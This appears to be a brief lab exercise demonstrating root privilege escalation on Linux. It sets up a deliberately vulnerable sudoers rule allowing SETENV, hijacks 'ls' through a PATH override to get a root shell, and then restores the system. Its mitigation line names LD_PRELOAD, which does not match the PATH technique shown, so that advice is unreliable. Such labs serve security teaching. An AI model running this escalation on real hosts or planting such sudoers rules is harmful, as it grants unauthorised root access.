# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser attacker
echo "attacker ALL=(ALL) NOPASSWD:SETENV: /home/attacker/script.sh" >> /etc/sudoers
echo 'ls -la' > /home/attacker/script.sh
chmod +x /home/attacker/script.sh
```

# Exploit

```bash
echo '/bin/bash' > /tmp/ls
sudo PATH=/tmp/:$PATH /home/attacker/script.sh
```

# Mitigate

```bash
# Remove env_keep += LD_PRELOAD
```

# Clean Up

```bash
deluser attacker --remove-home
cp /etc/sudoers.bak /etc/sudoers
```